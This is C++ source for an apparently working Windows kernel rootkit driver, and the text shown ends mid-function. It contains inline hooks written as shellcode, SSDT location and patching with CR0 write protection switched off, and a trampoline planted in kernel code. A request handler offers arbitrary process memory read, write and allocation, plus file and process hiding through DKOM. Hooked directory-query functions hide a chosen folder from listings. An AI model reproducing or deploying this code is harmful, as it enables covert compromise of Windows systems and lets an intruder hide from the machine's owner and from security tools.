#include <intrin.h>
#include "hooking.h"
#include "HookingGlobals.h"
#pragma warning(disable : 4996)
#pragma warning(disable : 4302)
#pragma warning(disable : 4311)


NTSTATUS roothook::SystemFunctionHook(PVOID HookingFunction, const char* ModuleName, const char* RoutineName, BOOL ToSave, ULONG Tag) {
	// Example call for driver function:    roothook::KernelFunctionHook(&roothook::HookHandler, "\\SystemRoot\\System32\\drivers\\dxgkrnl.sys", "NtQueryCompositionSurfaceStatistics", NULL);
	// Example call for kernel function:    roothook::KernelFunctionHook(&roothook::EvilQueryDirectoryFile, NULL, "NtQueryDirectoryFile", NULL);
	PVOID* SaveBuffer = NULL;
	ULONG64 ReplacementValue = 0;
	NTSTATUS Status = STATUS_UNSUCCESSFUL;
	UNICODE_STRING TargetName = { 0 };
	ANSI_STRING AnsiTargetName = { 0 };
	PVOID TargetFunction = NULL;

	BYTE ShellCode[] = { 0x49, 0xbd, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // movabs r13, evilfunction
									0x41, 0xff, 0xe5 };  // jmp r13 (jump to r13 value - the value of ReplacementFunc)
						 

	// Check for invalid parameters:
	if (HookingFunction == NULL) {
		DbgPrintEx(0, 0, "\n\n-=-=-=-=-=HOOK LOG=-=-=-=-=-\n\n");
		DbgPrintEx(0, 0, "KMDFdriver Hooking - System function hook failed (HookingFunction = NULL)\n");
		DbgPrintEx(0, 0, "\n-=-=-=-=-=HOOK ENDED=-=-=-=-=-\n\n");
		return STATUS_INVALID_PARAMETER;
	}


	// Get the address of the target function:
	if (ModuleName == NULL) {
		RtlInitAnsiString(&AnsiTargetName, RoutineName);
		Status = RtlAnsiStringToUnicodeString(&TargetName, &AnsiTargetName, TRUE);
		if (!NT_SUCCESS(Status)) {
			DbgPrintEx(0, 0, "\n\n-=-=-=-=-=HOOK LOG=-=-=-=-=-\n\n");
			DbgPrintEx(0, 0, "KMDFdriver Hooking - System function hook failed (cannot get RoutineName in UNICODE_STRING format: 0x%x)\n", Status);
			DbgPrintEx(0, 0, "\n-=-=-=-=-=HOOK ENDED=-=-=-=-=-\n\n");
			return STATUS_UNSUCCESSFUL;
		}
		TargetFunction = MmGetSystemRoutineAddress(&TargetName);
		if (TargetFunction == NULL) {
			DbgPrintEx(0, 0, "\n\n-=-=-=-=-=HOOK LOG=-=-=-=-=-\n\n");
			DbgPrintEx(0, 0, "KMDFdriver Hooking - Kernel function hook failed (cannot get address of kernel function)\n");
			DbgPrintEx(0, 0, "\n-=-=-=-=-=HOOK ENDED=-=-=-=-=-\n\n");
			return STATUS_INVALID_ADDRESS;
		}
	}
	else {
		TargetFunction = SystemModuleExportMEM(ModuleName, RoutineName);
		if (TargetFunction == NULL) {
			DbgPrintEx(0, 0, "\n\n-=-=-=-=-=HOOK LOG=-=-=-=-=-\n\n");
			DbgPrintEx(0, 0, "KMDFdriver Hooking - Driver function hook failed (failed getting the driver function base address)\n");
			DbgPrintEx(0, 0, "\n-=-=-=-=-=HOOK ENDED=-=-=-=-=-\n\n");
			return STATUS_INVALID_ADDRESS;
		}
	}


	// Save the original sizeof(ShellCode) bytes in buffer for later use in repairing it:	
	if (ToSave) {
		switch (Tag) {
		case 'HkQr': SaveBuffer = &OriginalNtQueryDirFile; break;
		case 'HkQx': SaveBuffer = &OriginalNtQueryDirFileEx; break;
		default: return STATUS_INVALID_PARAMETER;
		}
		*SaveBuffer = ExAllocatePoolWithTag(NonPagedPool, sizeof(ShellCode), Tag);
		if (*SaveBuffer == NULL) {
			DbgPrintEx(0, 0, "\n\n-=-=-=-=-=HOOK LOG=-=-=-=-=-\n\n");
			DbgPrintEx(0, 0, "KMDFdriver Hooking - System function hook failed (failed to save original content that will be replaced by hook - cannot allocate saving buffer)\n");
			DbgPrintEx(0, 0, "\n-=-=-=-=-=HOOK ENDED=-=-=-=-=-\n\n");
			return STATUS_MEMORY_NOT_ALLOCATED;
		}
		if (!WriteToReadOnlyMemoryMEM(*SaveBuffer, TargetFunction, sizeof(ShellCode), FALSE)) {
			DbgPrintEx(0, 0, "\n\n-=-=-=-=-=HOOK LOG=-=-=-=-=-\n\n");
			DbgPrintEx(0, 0, "KMDFdriver Hooking - System function hook failed (failed to save original content that will be replaced by hook)\n");
			DbgPrintEx(0, 0, "\n-=-=-=-=-=HOOK ENDED=-=-=-=-=-\n\n");
			if (*SaveBuffer != NULL) {
				ExFreePool(*SaveBuffer);
			}
			return STATUS_UNSUCCESSFUL;
		}
	}


	// Prepare the shellcode for deployment and write it into memory:
	ReplacementValue = (ULONG64)HookingFunction;
    RtlCopyMemory(&ShellCode[2], &ReplacementValue, sizeof(PVOID));
	if (!WriteToReadOnlyMemoryMEM(TargetFunction, &ShellCode, sizeof(ShellCode), TRUE)) {
		DbgPrintEx(0, 0, "\n\n-=-=-=-=-=HOOK LOG=-=-=-=-=-\n\n");
		DbgPrintEx(0, 0, "KMDFdriver Hooking - System function hook failed (failed to patch the original system function)\n");
		DbgPrintEx(0, 0, "\n-=-=-=-=-=HOOK ENDED=-=-=-=-=-\n\n");
		if (SaveBuffer != NULL && *SaveBuffer != NULL) {
			ExFreePool(*SaveBuffer);
		}
		return STATUS_UNSUCCESSFUL;
	}
	return STATUS_SUCCESS;
}


ULONG roothook::SSDT::GetSystemCallIndex(PUNICODE_STRING SystemServiceName) {
	PVOID SystemServiceAddress = MmGetSystemRoutineAddress(SystemServiceName);
	if (SystemServiceAddress == NULL) {
		return 0;
	}
	return (*(PULONG)((PUCHAR)SystemServiceAddress + 1));
}


void roothook::SSDT::EnableWriteProtection(KIRQL CurrentIRQL) {
	ULONG64 cr0 = __readcr0() | 0x10000;
	_enable();  // Enable interrupts, mightve interrupted the process
	__writecr0(cr0);
	KeLowerIrql(CurrentIRQL);
}


KIRQL roothook::SSDT::DisableWriteProtection() {
	KIRQL CurrentIRQL = KeRaiseIrqlToDpcLevel();
	ULONG64 cr0 = __readcr0() & 0xfffffffffffeffff;  // Assumes processor is AMD64
	__writecr0(cr0);
	_disable();    // Disable interrupts
	return CurrentIRQL;
}


ULONG64 roothook::SSDT::CurrentSSDTFuncAddr(ULONG SyscallNumber) {
	LONG SystemServiceValue = 0;
	PULONG ServiceTableBase = NULL;
	ServiceTableBase = (PULONG)KiServiceDescriptorTable->ServiceTableBase;
	SystemServiceValue = ServiceTableBase[SyscallNumber];
	SystemServiceValue = SystemServiceValue >> 4;
	return (ULONG64)SystemServiceValue + (ULONG64)ServiceTableBase;
}


ULONG64 roothook::SSDT::GetServiceDescriptorTable() {
	ULONG64  KiSystemCall64 = __readmsr(0xC0000082);	// Get the address of nt!KeSystemCall64
	ULONG64  KiSystemServiceRepeat = 0;
	INT32 Limit = 4096;
	for (int i = 0; i < Limit; i++) {
		if (*(PUINT8)(KiSystemCall64 + i) == 0x4C
			&& *(PUINT8)(KiSystemCall64 + i + 1) == 0x8D
			&& *(PUINT8)(KiSystemCall64 + i + 2) == 0x15){
			KiSystemServiceRepeat = KiSystemCall64 + i;  // Got stub of ServiceDescriptorTable from KiSystemServiceRepeat refrence
			return (ULONG64)(*(PINT32)(KiSystemServiceRepeat + 3) + KiSystemServiceRepeat + 7);	 // Convert relative address to absolute address
		}
	}

	return NULL;
}


ULONG roothook::SSDT::GetOffsetFromSSDTBase(ULONG64 FunctionAddress) {
	PULONG ServiceTableBase = (PULONG)KiServiceDescriptorTable->ServiceTableBase;
	return ((ULONG)(FunctionAddress - (ULONGLONG)ServiceTableBase)) << 4;
}


NTSTATUS roothook::SSDT::SystemServiceDTHook(PVOID HookingFunction, ULONG Tag){
	/*
	Business logic of hook:
	1) Get address of ServiceDescriptorTable with specific pattern matching in the kernel code section (.text)
	2) Get the address of the current function (will be put in *OriginalFunction) from the SSDT
	3) Add the address of the hooking function to the data of the trampoline dummy (SSDT entry is only 32 bits in x64, need to create stub hook and kump to that)
	4) Find an area inside the kernel's code section (.text) that can hold the data of the trampoline dummy hook (check sequence of nops big enough)
	5) Map the kernel's image into writeable memory, change protection settings to be able to write dummy hook into the kernel, write it into the kernel
	6) Disable WP (Write-Protected), patch the SSDT entry, enable WP protections
	7) Unmap the kernel image to save changes
	*/


	BYTE DummyTrampoline[] = { 0x50,  // push rax
							   0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // movabs rax, HookingFunction
							   0x48, 0x87, 0x04, 0x24,  // xchg QWORD PTR [rsp],rax
							   0xc3 };  // ret (jmp to HookingFunction)
	PVOID TrampolineSection = NULL;  // Will hold the matching sequence of nop/int3 instructions for the trampoline hook
	PVOID KernelMapping = NULL;
	PVOID* OriginalFunction = NULL;
	PMDL KernelModuleDescriptor = NULL;
	PULONG ServiceTableBase = NULL;  // Used to modify the actual entry in the SSDT
	KIRQL CurrentIRQL = NULL;
	ULONG SyscallNumber = 0;
	ULONG SSDTEntryValue = 0;


	// Check for invalid parameters:
	if (HookingFunction == NULL || Tag == 0){  // OriginalFunction == NULL || SyscallNumber == 0) {
		DbgPrintEx(0, 0, "\n\n-=-=-=-=-=HOOK LOG=-=-=-=-=-\n\n");
		DbgPrintEx(0, 0, "KMDFdriver SSDT hook failed (invalid parameters: %p, %lu)\n", HookingFunction, Tag);
		DbgPrintEx(0, 0, "\n-=-=-=-=-=HOOK ENDED=-=-=-=-=-\n\n");
		return STATUS_INVALID_PARAMETER;
	}


	// Get the original function matching buffer and find the syscall number:
	switch (Tag) {
	case 'HkQr': OriginalFunction = &ActualNtQueryDirFile; SyscallNumber = NTQUERY_SYSCALL1809; break;
	case 'HkQx': OriginalFunction = &ActualNtQueryDirFileEx;  SyscallNumber = NTQUERYEX_SYSCALL1809;  break;
	default:
		DbgPrintEx(0, 0, "\n\n-=-=-=-=-=HOOK LOG=-=-=-=-=-\n\n");
		DbgPrintEx(0, 0, "KMDFdriver SSDT hook failed (invalid tag)\n");
		DbgPrintEx(0, 0, "\n-=-=-=-=-=HOOK ENDED=-=-=-=-=-\n\n");
		return STATUS_INVALID_PARAMETER;
	}


	// Make preperations for SSDT hook - get SSDT address, get ntoskrnl.exe image base address and get code section (.text section) address of the kernel:
	if (KiServiceDescriptorTable == NULL) {
		KiServiceDescriptorTable = (PSYSTEM_SERVICE_TABLE)roothook::SSDT::GetServiceDescriptorTable();
	}
	if (KiServiceDescriptorTable == NULL) {
		DbgPrintEx(0, 0, "\n\n-=-=-=-=-=HOOK LOG=-=-=-=-=-\n\n");
		DbgPrintEx(0, 0, "KMDFdriver SSDT hook %lu failed (cannot find the service descriptor table base address)\n", SyscallNumber);
		DbgPrintEx(0, 0, "\n-=-=-=-=-=HOOK ENDED=-=-=-=-=-\n\n");
		return STATUS_NOT_FOUND;
	}
	if (KernelImageBaseAddress == NULL) {
		KernelImageBaseAddress = memory_helpers::GetModuleBaseAddressADD("\\SystemRoot\\System32\\ntoskrnl.exe");
	}
	if (KernelImageBaseAddress == NULL) {
		DbgPrintEx(0, 0, "\n\n-=-=-=-=-=HOOK LOG=-=-=-=-=-\n\n");
		DbgPrintEx(0, 0, "KMDFdriver SSDT hook %lu failed (cannot find the base address of the kernel image)\n", SyscallNumber);
		DbgPrintEx(0, 0, "\n-=-=-=-=-=HOOK ENDED=-=-=-=-=-\n\n");
		return STATUS_NOT_FOUND;
	}
	if (KernelTextSection == NULL || TextSectionSize == 0) {
		KernelTextSection = (BYTE*)memory_helpers::GetTextSectionOfSystemModuleADD(KernelImageBaseAddress, &TextSectionSize);
	}
	if (KernelTextSection == NULL) {
		DbgPrintEx(0, 0, "\n\n-=-=-=-=-=HOOK LOG=-=-=-=-=-\n\n");
		DbgPrintEx(0, 0, "KMDFdriver SSDT hook %lu failed (cannot find the base address of the .text section of the kernel)\n", SyscallNumber);
		DbgPrintEx(0, 0, "\n-=-=-=-=-=HOOK ENDED=-=-=-=-=-\n\n");
		return STATUS_NOT_FOUND;
	}


	// Get the address of the original function from the SSDT and copy the new function (HookingFunction) to the trampoline hook:
	*OriginalFunction = (PVOID)roothook::SSDT::CurrentSSDTFuncAddr(SyscallNumber);
	RtlCopyMemory(&DummyTrampoline[3], &HookingFunction, sizeof(PVOID));


	// Find a long enough sequence of nop/int3 instructions in the kernel's .text section to put the trampoline hook in:
	TrampolineSection = memory_helpers::FindUnusedMemoryADD(KernelTextSection, TextSectionSize, sizeof(DummyTrampoline));
	if (TrampolineSection == NULL) {
		DbgPrintEx(0, 0, "\n\n-=-=-=-=-=HOOK LOG=-=-=-=-=-\n\n");
		DbgPrintEx(0, 0, "KMDFdriver SSDT hook %lu failed (cannot find sequence of %zu bytes that are nop/int3 instructions, %p, %lu)\n", SyscallNumber, sizeof(DummyTrampoline), KernelTextSection, TextSectionSize);
		DbgPrintEx(0, 0, "\n-=-=-=-=-=HOOK ENDED=-=-=-=-=-\n\n");
		return STATUS_NOT_FOUND;
	}

	
	// Map the kernel into writeable space to be able to put trampoline hook in and modify the SSDT entry:
	KernelModuleDescriptor = IoAllocateMdl(TrampolineSection, sizeof(DummyTrampoline), 0, 0, NULL);
	if (KernelModuleDescriptor == NULL){
		DbgPrintEx(0, 0, "\n\n-=-=-=-=-=HOOK LOG=-=-=-=-=-\n\n");
		DbgPrintEx(0, 0, "KMDFdriver SSDT hook %lu failed (cannot allocate module descriptor to write into the kernel image, %p, %zu)\n", SyscallNumber, TrampolineSection, sizeof(DummyTrampoline));
		DbgPrintEx(0, 0, "\n-=-=-=-=-=HOOK ENDED=-=-=-=-=-\n\n");
		return STATUS_MEMORY_NOT_ALLOCATED;
	}
	MmProbeAndLockPages(KernelModuleDescriptor, KernelMode, IoWriteAccess);
	KernelMapping = MmMapLockedPagesSpecifyCache(KernelModuleDescriptor, KernelMode, MmCached, NULL, FALSE, NormalPagePriority);
	if (KernelMapping == NULL){
		MmUnlockPages(KernelModuleDescriptor);
		IoFreeMdl(KernelModuleDescriptor);
		DbgPrintEx(0, 0, "\n\n-=-=-=-=-=HOOK LOG=-=-=-=-=-\n\n");
		DbgPrintEx(0, 0, "KMDFdriver SSDT hook %lu failed (cannot map the kernel into writeable memory)\n", SyscallNumber);
		DbgPrintEx(0, 0, "\n-=-=-=-=-=HOOK ENDED=-=-=-=-=-\n\n");
		return STATUS_UNSUCCESSFUL;
	}

	
	// Patch the SSDT entry and write trampoline hook into the kernel:
	ServiceTableBase = (PULONG)KiServiceDescriptorTable->ServiceTableBase;
	CurrentIRQL = roothook::SSDT::DisableWriteProtection();  // Disable WP (Write-Protection) to be able to write into the SSDT
	RtlCopyMemory(KernelMapping, DummyTrampoline, sizeof(DummyTrampoline));  // Copy the trampoline hook in the kernel's memory
	SSDTEntryValue = roothook::SSDT::GetOffsetFromSSDTBase((ULONG64)TrampolineSection);
	SSDTEntryValue = SSDTEntryValue & 0xFFFFFFF0;
	SSDTEntryValue += ServiceTableBase[SyscallNumber] & 0x0F;  
	ServiceTableBase[SyscallNumber] = SSDTEntryValue;
	roothook::SSDT::EnableWriteProtection(CurrentIRQL);  // Enable WP (Write-Protection) to restore earlier settings


	// Unmap the kernel image:
	MmUnmapLockedPages(KernelMapping, KernelModuleDescriptor);
	MmUnlockPages(KernelModuleDescriptor);
	IoFreeMdl(KernelModuleDescriptor);
	DbgPrintEx(0, 0, "\n\n-=-=-=-=-=HOOK LOG=-=-=-=-=-\n\n");
	DbgPrintEx(0, 0, "KMDFdriver SSDT hook %lu succeeded\n", SyscallNumber);
	DbgPrintEx(0, 0, "\n-=-=-=-=-=HOOK ENDED=-=-=-=-=-\n\n");
	return STATUS_SUCCESS;
}


NTSTATUS roothook::SSDT::SystemServiceDTUnhook(PVOID HookingFunction, ULONG SyscallNumber) {
	PULONG ServiceTableBase = NULL;
	KIRQL CurrentIRQL = NULL;
	ULONG SSDTEntryValue = NULL;
	if (HookingFunction == NULL || SyscallNumber == 0) {
		DbgPrintEx(0, 0, "\n\n-=-=-=-=-=HOOK LOG=-=-=-=-=-\n\n");
		DbgPrintEx(0, 0, "KMDFdriver SSDT unhook failed (invalid parameters: %p, %lu)\n", HookingFunction, SyscallNumber);
		DbgPrintEx(0, 0, "\n-=-=-=-=-=HOOK ENDED=-=-=-=-=-\n\n");
		return STATUS_INVALID_PARAMETER;
	}
	ServiceTableBase = (PULONG)KiServiceDescriptorTable->ServiceTableBase;
	CurrentIRQL = roothook::SSDT::DisableWriteProtection();
	SSDTEntryValue = roothook::SSDT::GetOffsetFromSSDTBase((ULONG64)HookingFunction);
	SSDTEntryValue &= 0xFFFFFFF0;
	SSDTEntryValue += ServiceTableBase[SyscallNumber] & 0x0F;
	ServiceTableBase[SyscallNumber] = SSDTEntryValue;
	roothook::SSDT::EnableWriteProtection(CurrentIRQL);
	DbgPrintEx(0, 0, "\n\n-=-=-=-=-=HOOK LOG=-=-=-=-=-\n\n");
	DbgPrintEx(0, 0, "KMDFdriver SSDT unhook %lu succeeded\n", SyscallNumber);
	DbgPrintEx(0, 0, "\n-=-=-=-=-=HOOK ENDED=-=-=-=-=-\n\n");
	return STATUS_SUCCESS;
}


NTSTATUS roothook::HookHandler(PVOID hookedf_params) {
	DbgPrintEx(0, 0, "\n\n-=-=-=-=-=REQUEST LOG=-=-=-=-=-\n\n");
	DbgPrintEx(0, 0, "KMDFdriver HOOOOOKHANDLER (highest UM address = %p)\n", (PVOID)memory_helpers::GetHighestUserModeAddrADD());

	PVOID FileNameBuffer = NULL;
	UNICODE_STRING FileName = { 0 };
	ROOTKIT_MEMORY* RootkInstructions = (ROOTKIT_MEMORY*)hookedf_params;
	NTSTATUS Return = STATUS_SUCCESS;

	RootkInstructions->IsFlexible = FALSE;  // verify that operation was made and the transforming of data KM-UM
	switch (RootkInstructions->Operation) {
	case RKOP_MDLBASE:
		// Request process module address -

		DbgPrintEx(0, 0, "Request Type: get base address of module\n");
		Return = GetModuleBaseRK(RootkInstructions);
		DbgPrintEx(0, 0, "\n-=-=-=-=-=REQUEST ENDED=-=-=-=-=-\n\n");
		return Return;


	case RKOP_WRITE:
		// Copy into memory -

		DbgPrintEx(0, 0, "Request Type: write data into memory\n");
		Return = WriteToMemoryRK(RootkInstructions);
		DbgPrintEx(0, 0, "\n-=-=-=-=-=REQUEST ENDED=-=-=-=-=-\n\n");
		return Return;


	case RKOP_READ:
		// Read from memory -

		DbgPrintEx(0, 0, "Request Type: read data from memory\n");
		Return = ReadFromMemoryRK(RootkInstructions);
		DbgPrintEx(0, 0, "\n-=-=-=-=-=REQUEST ENDED=-=-=-=-=-\n\n");
		return Return;


	case RKOP_SYSINFO:
		// get system information/s by request -

		DbgPrintEx(0, 0, "Request Type: get information about target system\n");
		Return = RetrieveSystemInformationRK(RootkInstructions);
		DbgPrintEx(0, 0, "\n-=-=-=-=-=REQUEST ENDED=-=-=-=-=-\n\n");
		return Return;


	case RKOP_PRCMALLOC:
		// allocate specified memory in specified process -

		DbgPrintEx(0, 0, "Request Type: allocate memory in the virtual address space of a process\n");
		Return = AllocSpecificMemoryRK(RootkInstructions);
		DbgPrintEx(0, 0, "\n-=-=-=-=-=REQUEST ENDED=-=-=-=-=-\n\n");
		return Return;

	case RKOP_HIDEFILE:
		// hide file/folder -

		DbgPrintEx(0, 0, "Request Type: hide file/folder (0xFFFFFFFFFFFFFFFF = hide, 0x7777FFFFFFFFFFFF = return list, else = remove by index (value = index),\nActual reserved value: %p\n", RootkInstructions->Reserved);
		
		// Handle additional preoperation dependencies:
		if ((ULONG64)RootkInstructions->Reserved == HIDE_FILE) {
			FileNameBuffer = ExAllocatePoolWithTag(NonPagedPool, RootkInstructions->Size, 'HfNb');
			if (FileNameBuffer == NULL) {
				return general_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_MEMALLOC, STATUS_MEMORY_NOT_ALLOCATED, RootkInstructions);
			}
			RootkInstructions->Out = FileNameBuffer;
		}
		else if ((ULONG64)RootkInstructions->Reserved == SHOW_HIDDEN) {
			RootkInstructions->Buffer = &HookHide;
			RootkInstructions->Size = HookHide.BufferSize;
		}
		Return = HideFileObjectRK(RootkInstructions);
		if (Return == HIDE_TEMPSUC) {
			// Returned from regular file hiding:
			if (FileNameBuffer == NULL) {
				DbgPrintEx(0, 0, "KMDFdriver Requests - Hide file object failed (impossible name buffer = NULL)\n");
				DbgPrintEx(0, 0, "\n-=-=-=-=-=REQUEST ENDED=-=-=-=-=-\n\n");
				return general_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_MEMALLOC, STATUS_MEMORY_NOT_ALLOCATED, RootkInstructions);
			}
			FileName.Buffer = (WCHAR*)FileNameBuffer;
			FileName.Length = (USHORT)(wcslen((WCHAR*)FileNameBuffer) * sizeof(WCHAR));
			FileName.MaximumLength = FileName.Length;
			if (!HookHide.AddToHideFile(&FileName)) {
				DbgPrintEx(0, 0, "KMDFdriver Requests - Hide file object failed (Failed to add file/folder name %wZ to hiding list)\n", FileName);
				DbgPrintEx(0, 0, "\n-=-=-=-=-=REQUEST ENDED=-=-=-=-=-\n\n");
				if (FileNameBuffer != NULL) {
					ExFreePool(FileNameBuffer);
				}
				return general_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_OTHER, STATUS_UNSUCCESSFUL, RootkInstructions);
			}
			else {
				DbgPrintEx(0, 0, "KMDFdriver Requests - Hide file object succeded (Succeeded to add file/folder name %wZ to hiding list)\n", FileName);
				DbgPrintEx(0, 0, "\n-=-=-=-=-=REQUEST ENDED=-=-=-=-=-\n\n");
				if (FileNameBuffer != NULL) {
					ExFreePool(FileNameBuffer);
				}
				return general_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_SUCCESS, STATUS_SUCCESS, RootkInstructions);
			}
		}
		else if (Return == UNHIDE_TEMPSUC) {
			// Returned from removing file:
			if (!HookHide.RemoveFromHideFile((int)RootkInstructions->Reserved, &FileName)) {
				if (FileName.Buffer == NULL) {
					DbgPrintEx(0, 0, "KMDFdriver Requests - Hide file object failed (Failed to remove file/folder at index %llu to hiding list)\n", (ULONG64)RootkInstructions->Reserved);
				}
				else {
					DbgPrintEx(0, 0, "KMDFdriver Requests - Hide file object failed (Failed to remove file/folder at index %llu, name %wZ to hiding list)\n", (ULONG64)RootkInstructions->Reserved, FileName);
				}
				DbgPrintEx(0, 0, "\n-=-=-=-=-=REQUEST ENDED=-=-=-=-=-\n\n");
				return general_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_OTHER, STATUS_UNSUCCESSFUL, RootkInstructions);
			}
			else {
				DbgPrintEx(0, 0, "KMDFdriver Requests - Hide file object succeeded (Succeeded to remove file/folder at index %llu, name %wZ to hiding list)\n", (ULONG64)RootkInstructions->Reserved, FileName);
				DbgPrintEx(0, 0, "\n-=-=-=-=-=REQUEST ENDED=-=-=-=-=-\n\n");
				return general_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_SUCCESS, STATUS_SUCCESS, RootkInstructions);
			}
		}
		else if (Return == SHOWHIDDEN_TEMPSUC) {
			DbgPrintEx(0, 0, "KMDFdriver Requests - Hide file object succeeded (Succeeded to transfer hidden list to medium, Count %lu, Size %lu, Divider %c)\n", HookHide.HideCount, HookHide.BufferSize, HookHide.HideDivider);
			DbgPrintEx(0, 0, "\n-=-=-=-=-=REQUEST ENDED=-=-=-=-=-\n\n");
			return general_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_SUCCESS, STATUS_SUCCESS, RootkInstructions);
		}

		DbgPrintEx(0, 0, "KMDFdriver Requests - Hide file object failed (Failed to make basic operation)\n");
		DbgPrintEx(0, 0, "\n-=-=-=-=-=REQUEST ENDED=-=-=-=-=-\n\n");
		if (FileNameBuffer != NULL) {
			ExFreePool(FileNameBuffer);
		}
		return Return;
	case RKOP_HIDEPROC:
		// Hide process with DKOM:

		DbgPrintEx(0, 0, "Request Type: hide process via DKOM\n");
		Return = HideProcessRK(RootkInstructions);
		DbgPrintEx(0, 0, "\n-=-=-=-=-=REQUEST ENDED=-=-=-=-=-\n\n");
		return Return;
	}
	return STATUS_SUCCESS;
}


NTSTATUS roothook::EvilQueryDirectoryFile(IN HANDLE FileHandle,
	IN HANDLE Event OPTIONAL,
	IN PIO_APC_ROUTINE ApcRoutine OPTIONAL,
	IN PVOID ApcContext OPTIONAL,
	OUT PIO_STATUS_BLOCK IoStatusBlock,
	OUT PVOID FileInformation,
	IN ULONG Length,
	IN FILE_INFORMATION_CLASS FileInformationClass,
	IN BOOLEAN ReturnSingleEntry,
	IN PUNICODE_STRING FileName OPTIONAL,
	IN BOOLEAN RestartScan) {
	UNICODE_STRING RequestedDir = { 0 };
	UNICODE_STRING CurrentFile = { 0 };
	UNICODE_STRING SusFolder = { 0 };
	UNICODE_STRING QueryUnicode = { 0 };
	RtlInitUnicodeString(&SusFolder, L"nosusfolder");
	RtlInitUnicodeString(&QueryUnicode, L"NtQueryDirectoryFile");

	IO_STATUS_BLOCK DirStatus = { 0 };
	QueryDirFile OgNtQueryDirectoryFile = NULL;
	NTSTATUS Status = STATUS_UNSUCCESSFUL;
	BOOL IsDirSame = TRUE;
	BOOL IsSystemRoot = TRUE;
	PVOID HandleInfo = NULL;
	

	// Call the original NtQueryDirectoryFile:
	OgNtQueryDirectoryFile = (QueryDirFile)ActualNtQueryDirFile;
	Status = OgNtQueryDirectoryFile(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation,
		Length, FileInformationClass, ReturnSingleEntry, FileName, RestartScan);
	if (!NT_SUCCESS(Status) || FileInformation == NULL) {
		//DbgPrintEx(0, 0, "\n\n-=-=-=-=-=FAKE LOG=-=-=-=-=-\n\n");
		//DbgPrintEx(0, 0, "KMDFdriver Hooking - Fake NtQueryDirectoryFile: actual NtQueryDirectoryFile failed with 0x%x\n", Status);
		//DbgPrintEx(0, 0, "\n-=-=-=-=-=FAKE ENDED=-=-=-=-=-\n\n");
		return Status;
	}



	// Allocate buffer for handle path (format - "\nosusfolder\verysus\...\actualsearchdir) and get the handle path:
	HandleInfo = ExAllocatePoolWithTag(NonPagedPool, sizeof(FILE_NAME_INFORMATION) + (MAX_PATH - 1), 'KfHi');
	if (HandleInfo == NULL) {
		return STATUS_UNSUCCESSFUL;
	}
	RtlZeroMemory(HandleInfo, sizeof(FILE_NAME_INFORMATION) + (MAX_PATH - 1));  // Make sure no leftovers of path are in pool
	Status = ZwQueryInformationFile(FileHandle, &DirStatus, HandleInfo, sizeof(FILE_NAME_INFORMATION) + (MAX_PATH - 1), FileNameInformation);
	if (!NT_SUCCESS(Status)) {
		ExFreePool(HandleInfo);
		return STATUS_UNSUCCESSFUL;
	}
	RtlInitUnicodeString(&RequestedDir, ((PFILE_NAME_INFORMATION)HandleInfo)->FileName);
	ExFreePool(HandleInfo);


	// Search if path starts with "nosusfolder":
	SearchForInitialEvilDir(&RequestedDir, &IsSystemRoot, &IsDirSame, 2);


	// Filter results by type of information requested (both/bothid = fileexp,full/fullid=dir,cd):

	Status = IterateOverFiles(FileInformationClass, FileInformation, &DirStatus, &IsDirSame, &RequestedDir, &IsSystemRoot,
		&SusFolder, &QueryUnicode);
	if (Status == STATUS_INVALID_PARAMETER) {
		return STATUS_SUCCESS;  // type of information that is not traced, return success (nothing to change)
	}
	return Status;
}


NTSTATUS roothook::EvilQueryDirectoryFileEx(IN HANDLE FileHandle,
	IN HANDLE Event OPTIONAL,
	IN PIO_APC_ROUTINE ApcRoutine OPTIONAL,
	IN PVOID ApcContext OPTIONAL,
	OUT PIO_STATUS_BLOCK IoStatusBlock,
	OUT PVOID FileInformation,
	IN ULONG Length,
	FILE_INFORMATION_CLASS FileInformationClass,
	IN ULONG QueryFlags,
	IN PUNICODE_STRING FileName OPTIONAL) {
	UNICODE_STRING RequestedDir = { 0 };
	UNICODE_STRING CurrentFile = { 0 };
	UNICODE_STRING SusFolder = { 0 };
	UNICODE_STRING QueryExUnicode = { 0 };
	RtlInitUnicodeString(&SusFolder, L"nosusfolder");
	RtlInitUnicodeString(&QueryExUnicode, L"NtQueryDirectoryFileEx");

	IO_STATUS_BLOCK DirStatus = { 0 };
	QueryDirFileEx OgNtQueryDirectoryFileEx = NULL;
	NTSTATUS Status = STATUS_UNSUCCESSFUL;
	BOOL IsDirSame = TRUE;
	BOOL IsSystemRoot = TRUE;
	PVOID HandleInfo = NULL;
	UNICODE_STRING QueryUnicode = { 0 };

	
	// Call the original NtQueryDirectoryFile:
	OgNtQueryDirectoryFileEx = (QueryDirFileEx)ActualNtQueryDirFileEx;
	Status = OgNtQueryDirectoryFileEx(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation,
		Length, FileInformationClass, QueryFlags, FileName);
	if (!NT_SUCCESS(Status) || FileInformation == NULL) {
		//DbgPrintEx(0, 0, "\n\n-=-=-=-=-=FAKE LOG=-=-=-=-=-\n\n");
		//DbgPrintEx(0, 0, "KMDFdriver Hooking - Fake NtQueryDirectoryFileEx: actual NtQueryDirectoryFileEx failed with 0x%x\n", Status);
		//DbgPrintEx(0, 0, "\n-=-=-=-=-=FAKE ENDED=-=-=-=-=-\n\n");
		return Status;
	}


	// Allocate buffer for handle path (format - "\nosusfolder\verysus\...\actualsearchdir) and get the handle path:
	HandleInfo = ExAllocatePoolWithTag(NonPagedPool, sizeof(FILE_NAME_INFORMATION) + (MAX_PATH - 1), 'KfHi');
	if (HandleInfo == NULL) {
		return STATUS_UNSUCCESSFUL;
	}
	RtlZeroMemory(HandleInfo, sizeof(FILE_NAME_INFORMATION) + (MAX_PATH - 1));  // Make sure no leftovers of path are in pool
	Status = ZwQueryInformationFile(FileHandle, &DirStatus, HandleInfo, sizeof(FILE_NAME_INFORMATION) + (MAX_PATH - 1), FileNameInformation);
	if (!NT_SUCCESS(Status)) {
		ExFreePool(HandleInfo);
